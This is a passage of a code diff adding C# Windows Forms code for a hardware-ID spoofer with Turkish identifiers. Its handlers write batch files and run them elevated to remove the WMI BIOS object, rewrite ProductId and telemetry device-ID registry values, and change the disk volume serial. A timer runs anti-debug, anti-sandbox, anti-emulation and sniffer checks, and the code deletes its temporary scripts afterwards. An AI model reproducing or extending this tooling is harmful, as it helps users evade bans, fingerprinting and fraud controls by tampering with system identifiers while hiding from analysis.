+            using (StreamWriter sww = File.CreateText(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat"))
+            {
+                sww.WriteLine("@echo off");
+                sww.WriteLine("powershell Remove-WMIObject Win32_BIOS");
+                sww.WriteLine(@"cd C:\Users\" + Environment.UserName + @"\AppData\Local\Temp");
+                sww.WriteLine("mofcomp 6d.xml");
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+         //   Process.Start(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat");
+          //  Thread.Sleep(4000);
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.bat");
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\6d.xml");
+
+            return true;
+        }
+
+        private void label17_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool ekraniddalgasi = ekranid();
+            if (ekraniddalgasi)
+                label17.ForeColor = Color.Green;
+            if (!ekraniddalgasi)
+                label17.ForeColor = Color.Red;
+            isStarted = false;
+        }
+
+        private void Control_FormClosed(object sender, FormClosedEventArgs e)
+        {
+       //     kontrolsik();
+        }
+
+        private void Control_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            timer1.Stop();
+            taskac();
+        //    kontrolsik();
+        }
+
+        private void timer1_Tick_1(object sender, EventArgs e)
+        {
+            taskkapat();
+            ortak.WebSniffers(true);
+            ortak.Sandboxie(true);
+            ortak.Emulation(true); 
+            ortak.AntiDebug(true);
+            System.Diagnostics.Process currentProcess = System.Diagnostics.Process.GetCurrentProcess();
+            string str1 = currentProcess.ProcessName + ".exe";
+            System.Diagnostics.Process[] processesByName = System.Diagnostics.Process.GetProcessesByName(currentProcess.ProcessName);
+
+            if (processesByName.Length > 1)
+            {
+                foreach (System.Diagnostics.Process process in processesByName)
+                {
+                    if (System.Diagnostics.Process.GetCurrentProcess().Id != process.Id)
+                    {
+                        try
+                        {
+                            process.Kill();
+                        }
+                        catch
+                        {
+                        }
+                    }
+                }
+            }
+
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool machineguids = SetMachineGuid();
+            if (machineguids)
+                label2.ForeColor = Color.Green;
+            if (!machineguids) label2.ForeColor = Color.Red;
+            isStarted = false;
+        }
+
+        private void label18_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            if (textDeviceId.Text.Length > 10)
+            {
+
+                Copy(textDeviceId.Text);
+                bool deviceiddalgasi = setDeviceId();
+           
+            }
+     
+        }
+
+        private void label10_Click_1(object sender, EventArgs e)
+        {
+          
+        }
+
+        private void textMachine_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label14_Click(object sender, EventArgs e)
+        {
+            if (!ortak.CheckEthernet())
+            {
+                MessageBox.Show("Check ethernet connection.", "Failed");
+                Environment.Exit(0);
+                return;
+            }
+            isStarted = true;
+            bool volumedede = sikiddegis();
+            if (volumedede) label14.ForeColor = Color.Green;
+            isStarted = false;
+        }
+        void BulVeYazdir(string metin)
+        {
+            // Aranacak desenin başlangıç indeksini bul
+            int baslangicIndex = metin.IndexOf("&deviceId=s%");
+
+            // Deseni bulamazsa hata mesajı yazdır
+            if (baslangicIndex == -1)
+            {
+               // MessageBox.Show("Desen bulunamadı.");
+                return;
+            }
+
+            // Başlangıç indeksinden itibaren &'a kadar olan kısmı al ve konsola yazdır
+            int sonrakiAIndex = metin.IndexOf("&", baslangicIndex + "&deviceId=s%".Length);
+
+            if (sonrakiAIndex != -1)
+            {
+                string bulunanKisim = metin.Substring(baslangicIndex, sonrakiAIndex - baslangicIndex);
+            //    MessageBox.Show(bulunanKisim.Replace("&deviceId=s%","").Substring(1));
+            }
+            else
+            {
+                Console.WriteLine("Desenin bitişini bulamadı.");
+            }
+            string bulunan = metin.Substring(baslangicIndex, sonrakiAIndex - baslangicIndex);
+            if (textDeviceId.Text != bulunan.Replace("&deviceId=s%", "").Substring(1))
+            {
+                string aga = bulunan.Replace("&deviceId=s%","").Substring(1);
+                aga = metin.Replace(aga, textDeviceId.Text);
+               // MessageBox.Show(aga);
+                RegistryKey registryKey2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
+                RegistryKey registryKey3 = registryKey2.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Diagnostics\DiagTrack\SettingsRequests\TELEMETRY.ASM-WINDOWSSQ", true);
+
+                registryKey3.SetValue("ETagQueryParameters", aga);
+            }
+        }
+        void coco2()
+        {
+            string batFilePath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat";
+            using (StreamWriter sw = File.CreateText(batFilePath))
+            {
+                sw.WriteLine("@echo off");
+                sw.WriteLine("set \"registryPath=HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\SQMClient\"");
+                sw.WriteLine("set \"registryName=ProductId\"");
+                sw.WriteLine("set \"registryValue=" + textProductID.Text + "\"");
+                sw.WriteLine("reg add \"" + "HKLM\\%registryPath%\" /v \"%registryName%\" /t REG_SZ /d \"%registryValue%\" /f");
+
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat");
+
+
+        }
+
+        void coco()
+        {
+            string batFilePath = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat";
+            using (StreamWriter sw = File.CreateText(batFilePath))
+            {
+                sw.WriteLine("@echo off");
+                sw.WriteLine("set \"registryPath=SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\"");
+                sw.WriteLine("set \"registryName=ProductId\"");
+                sw.WriteLine("set \"registryValue=" + textProductID.Text + "\"");
+                sw.WriteLine("reg add \"" + "HKLM\\%registryPath%\" /v \"%registryName%\" /t REG_SZ /d \"%registryValue%\" /f");
+
+            }
+            ProcessStartInfo processStartInfo = new ProcessStartInfo(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat");
+            processStartInfo.Verb = "runas"; // 
+            Process process = new Process();
+            process.StartInfo = processStartInfo;
+            process.Start();
+            process.WaitForExit();
+            File.Delete(@"C:\Users\" + Environment.UserName + @"\AppData\Local\Temp\bom.bat");
+
+
+        }
+        private void bunifuCustomLabel1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void pictureBox1_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void label4_Click(object sender, EventArgs e)
+       {
+           if (!ortak.CheckEthernet())
+           {
+               MessageBox.Show("Check ethernet connection.", "Failed");
+               Environment.Exit(0);
+               return;
+           }
+           isStarted = true;
+           bool diskdalgasi = diskvolume();
+           if (diskdalgasi)
+               label4.ForeColor = Color.Green;
+            //  isStarted = false;
+
+
+            setvolexe();
+        }
+
+        private void label5_Click(object sender, EventArgs e)
+       {
+           if (!ortak.CheckEthernet())
+           {
+               MessageBox.Show("Check ethernet connection.", "Failed");
+               Environment.Exit(0);
+               return;
+           }
+           isStarted = true;
+           bool mother = AnakartDegis();
+           if (mother) label5.ForeColor = Color.Green;
+           isStarted = false;  
+       }
+
+       public static class ProductId
+       {
+           public static Regedit regeditOBJ = new Regedit(@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
+           public static readonly string Key = "ProductID";
+
+           public static string GetValue()
+           {
+               return regeditOBJ.Read(Key);
+           }
+
+           public static bool SetProductID(object value)
+           {
+               return regeditOBJ.Write(Key, value);
+           }
+           public static class Utilities
+           {
+               private static Random rand = new Random();
+               public const string Alphabet = "ABCDEF0123456789";
+               private static Random random = new Random();
+               public const string Alphabet1 = "abcdef0123456789";
+
+               public static string GenerateString(int size)
+               {
+                   char[] array = new char[size];
+                   for (int i = 0; i < size; i++)
+                   {
+                       array[i] = Alphabet[rand.Next(Alphabet.Length)];
+                   }
+                   return new string(array);
+               }
+           }
+           public static StringBuilder Log = new StringBuilder();
+           public static bool Spoof()
+           {
+               /*  Log.Clear();
+                 string oldValue = GetValue();
+                 bool result = SetValue(Utilities.GenerateString(5) + "-" + Utilities.GenerateString(5) + "-" + Utilities.GenerateString(5) + "-" + Utilities.GenerateString(5));
+                 if (result)
+                 {
+                     Log.AppendLine("  [SPOOFER] Computer ProductID Changed from " + oldValue + " to " + GetValue());
+                 }
+                 else
+                 {
+                     Log.AppendLine("  [SPOOFER] Error accessing the Registry... Maybe run as admin");
+                 }
+                 return result;*/
+            return true;
+            }
+        }
+
+        public static void BilgiMesajGonder(string mesaj, string baslik)
+        {
+            MessageBox.Show(mesaj, baslik);
+        }
+        public static void SetDisk()
+        {
+            string drive = "C";
+            ManagementObject disk = new ManagementObject("win32_logicaldisk.deviceid=\"" + drive + ":\"");
+            disk.Get();
+
+
+            disk["VolumeSerialNumber"] = "4E45C67DF2D9DEFF";
+            disk.Put();
+        }
+        public static string GetSikDrive()
+        {
+            string str = string.Empty;
+            try
+            {
+                foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("Select * FROM WIN32_DiskDrive").Get())
+                    str = managementBaseObject["SerialNumber"].ToString();
+            }
+            catch
+            {
+                str = "FAILED";
+            }
+            return str;
+        }
+        public void GetDisk()
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process()
+            {
+                StartInfo = new ProcessStartInfo()
+                {
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    FileName = "CMD.exe",
+                    Arguments = "/C wmic logicaldisk get VolumeSerialNumber"
+                }
+            };
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.RedirectStandardOutput = true;
+            process.Start();
+            process.WaitForExit();
+        
+            string output= process.StandardOutput.ReadToEnd();
+            textDisk.Text = output.Replace("VolumeSerialNumber", "").Trim();
+
+
+
+            /*            StringCollection propNames = new StringCollection();
+                        ManagementClass driveClass = new ManagementClass("Win32_DiskDrive");
+                        PropertyDataCollection props = driveClass.Properties;
+                        foreach (PropertyData driveProperty in props)
+                        {
+                            propNames.Add(driveProperty.Name);
+                        }
+                        int idx = 0;
+                        ManagementObjectCollection drives = driveClass.GetInstances();
+                        foreach (ManagementObject drv in drives)
+                        {
+                            Label2.Text += (idx + 1);
+                            foreach (string strProp in propNames)
+                            {
+                                //Label2.Text+=drv[strProp];
+                                Response.Write(strProp + "   =   " + drv[strProp] + "</br>");
+                            }
+                        }*/
+        }
+
+        public void GetMotherBoard()
+        {
+            ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
+            ManagementObjectCollection moc = mos.Get();
+            foreach (ManagementObject mo in moc)
+            {
+                motherboard = (string)mo["SerialNumber"];
+            }
+        }
+      
+        private void button1_Click(object sender, EventArgs e)
+        {
+        
+        }
+    }
+}```
